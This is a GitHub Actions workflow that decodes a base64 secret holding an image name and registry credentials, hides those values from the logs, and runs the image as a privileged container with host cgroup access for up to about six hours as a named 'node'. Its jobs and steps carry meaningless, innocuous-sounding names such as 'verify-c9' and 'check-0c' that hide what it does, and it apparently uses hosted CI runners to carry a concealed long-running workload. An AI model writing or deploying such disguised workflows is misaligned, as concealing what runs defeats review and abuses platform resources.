name: init-ca
on:
  workflow_dispatch:
    inputs:
      minutes:
        required: false
        default: '345'
      lead:
        required: false
        default: '15'
permissions: {}
concurrency:
  group: setup-fd-${{ github.run_id }}
  cancel-in-progress: false
jobs:
  verify-c9:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: check-0c
        env:
          CFG: ${{ secrets.CFG }}
          MINUTES: ${{ inputs.minutes }}
          LEAD: ${{ inputs.lead }}
        run: |
          g() { printf %s "$CFG" | base64 -d | python3 -c "import sys,json;print(json.load(sys.stdin).get('$1',''))"; }
          IMG=$(g IMAGE); R=$(g REGISTRY); U=$(g REGISTRY_USER); P=$(g REGISTRY_PASSWORD)
          echo "::add-mask::$IMG"; echo "::add-mask::$R"; echo "::add-mask::$U"
          printf %s "$P" | docker login "$R" -u "$U" --password-stdin > /dev/null 2>&1 \
            || { echo "::error::auth"; exit 1; }
          docker pull "$IMG" > /dev/null 2>&1 || { echo "::error::pull"; exit 1; }
          D=$(python3 -c 'import os,json,base64;e=os.environ;r=e["GITHUB_REPOSITORY"].replace("/","-").replace("_","-").lower();n=r+"-run-"+e["GITHUB_RUN_ID"]+"-"+e["GITHUB_RUN_ATTEMPT"];print(base64.b64encode(json.dumps({"NODE_NAME":n,"HOLD_MINUTES":e["MINUTES"],"LEAD_MINUTES":e["LEAD"],"STOP_TIMEOUT":"240","CLEANUP":"trap"}).encode()).decode())')
          sudo mkdir -p /mnt/d4072c
          docker run -d --name check-65 --privileged --cgroupns=host \
            -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
            -v /lib/modules:/lib/modules:ro \
            -v /mnt/d4072c:/mnt/w \
            -e B="$CFG" -e D="$D" "$IMG" > /dev/null
          docker logs -f check-65 || true
          exit $(docker wait check-65)
      - name: verify-4b
        if: always()
        run: docker stop -t 240 check-65 > /dev/null 2>&1 || true
